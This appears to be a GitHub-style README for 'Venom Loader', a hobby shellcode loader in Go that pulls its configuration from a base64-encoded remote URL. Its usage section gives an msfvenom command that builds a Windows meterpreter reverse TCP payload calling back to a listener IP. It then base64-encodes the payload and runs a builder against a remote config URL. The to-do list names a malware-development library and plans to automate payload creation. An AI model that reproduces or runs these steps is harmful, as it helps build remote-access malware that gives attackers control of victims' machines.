
# Venom Loader

A tiny shellcode loader I am having fun with. It reads a JSON file from a base64 encoded URL. It works rather nicely and works mostly as advertised.




## Usage/Examples

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LISTENER_IP> LPORT=<LISTENER_PORT> -f raw -o WHATEVER.bin
base64 WHATEVER.bin > WHATEVERb64.bin
./builder.sh <http://IP/config> main.go
```
At this point the loader as well as a basic payload should be ready. Modify the main.go and instr file to suit your situation.
## To-Do

- Make a builder that automates creation of msf payload and base64 encoding it.
- Remove dependancy on https://github.com/D3Ext/maldev/ to reduce built binary size.